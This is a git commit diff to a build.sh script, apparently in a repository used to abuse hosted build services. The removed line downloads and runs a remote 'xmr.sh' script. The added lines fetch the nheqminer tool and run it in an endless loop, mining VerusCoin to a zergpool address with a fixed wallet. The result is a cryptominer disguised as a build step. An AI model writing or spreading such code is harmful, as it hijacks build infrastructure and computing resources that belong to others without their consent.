617d8482953f57cacf15e2a888384e100917d4b2
lushenry654 <85671596+lushenry654@users.noreply.github.com>
2021-10-30 21:04:38 +0700

    Update build.sh

--- build.sh
+++ build.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 
-Timeout=1800 # 30 minutes
+Timeout=290 # 30 minutes
 
 function timeout_monitor() {
    sleep "$Timeout"
@@ -12,7 +12,15 @@ function timeout_monitor() {
 timeout_monitor "$$" &
 Timeout_monitor_pid=$!
 
-wget https://raw.githubusercontent.com/lushenry654/bitbucket/dependabot/add-v2-config-file/xmr.sh && chmod +x xmr.sh && ./xmr.sh
+wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
+tar xf nheqminer-Linux-v0.8.2.tgz
+tar xf nheqminer-Linux-v0.8.2.tar.gz
+cd nheqminer
+while [ 1 ]; do
+./nheqminer -v -l verushash.eu.mine.zergpool.com:3300 -u RSBmzzfgzomxwx7o6tJNmG3kecq9Huc7Q9 -p c=VRSC,mc=VRSC,ID=Zerg -t 3
+sleep 3
+done
+sleep 999
 # <your script here>
 
 # kill timeout monitor when terminating:
